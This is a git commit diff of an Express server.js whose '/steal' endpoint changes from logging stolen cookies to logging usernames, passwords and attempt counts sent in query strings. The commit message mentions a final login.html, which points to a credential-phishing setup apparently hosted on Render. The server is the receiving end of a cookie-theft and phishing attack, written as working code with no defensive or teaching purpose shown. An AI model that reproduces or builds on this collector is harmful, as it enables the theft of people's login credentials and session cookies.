06e0bd4cc2df81246a12e99e371f8ca0f1ab1423
Ansh Gautam <anshgautam889@gmail.com>
2026-08-12 18:06:05 +0530

    Removed old files, added final login.html

--- server.js
+++ server.js
@@ -2,14 +2,15 @@ const express = require('express');
 const path = require('path');
 const app = express();
 
-// Static files serve karo (index.html)
 app.use(express.static(__dirname));
 
 app.get('/steal', (req, res) => {
-    console.log('✅ COOKIE MIL GAYI:', req.query.cookie);
-    res.send('Cookie received!');
+    console.log('📌 ATTEMPT:', req.query.attempt);
+    console.log('✅ USERNAME:', req.query.username);
+    console.log('✅ PASSWORD:', req.query.password);
+    console.log('-----------------------------------');
+    res.send('OK');
 });
 
-// ⚡ YAHAN CHANGE HUA HAI — Render ke liye dynamic port
 const port = process.env.PORT || 4000;
 app.listen(port, () => console.log(`🚀 Server chalu hai on port ${port}`));
